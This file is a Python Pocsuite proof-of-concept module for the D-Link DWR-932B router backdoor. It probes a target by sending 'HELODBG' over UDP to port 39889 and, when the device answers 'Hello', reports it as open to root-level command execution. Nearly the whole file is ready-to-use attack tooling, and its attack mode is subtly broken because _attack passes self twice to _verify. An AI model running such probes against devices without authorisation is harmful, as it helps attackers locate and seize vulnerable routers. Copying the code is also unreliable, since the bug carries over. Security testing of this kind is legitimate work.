#!/usr/bin/python
# -*- coding: utf-8 -*-

from pocsuite.api.request import req
from pocsuite.api.poc import Output, POCBase
from pocsuite.api.poc import register
from pocsuite.api.utils import url2ip
import socket


class TestPOC(POCBase):
    name = "D-LINK DWR-932B Backdoor"
    vulID = ''
    author = ['sebao']
    vulType = 'Backdoor'
    version = '1.0'  # default version: 1.0
    references = 'https://pierrekim.github.io/advisories/2016-dlink-0x00.txt'
    desc = 'Module exploits D-Link DWR-932B backdoor vulnerability which allows executing command on operating system level with root privileges.'


    vulDate = ''
    createDate = '2017-10-17'
    updateDate = '2017-10-17'

    appName = 'D-Link'
    appVersion = 'DWR-932B'
    dork = ''
    appPowerLink = 'http://www.dlink.com'
    samples = []

    def _attack(self):

        return self._verify(self)

    def _verify(self):
        '''verify mode'''
        result = {}
        url = url2ip(self.url)

        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(10.0)
        sock.sendto("HELODBG", (url, 39889))
        response = sock.recv(1024)

        if "Hello" in response:
            sock.sendto("BYEDBG", (url, 39889))
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = url

        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register(TestPOC)
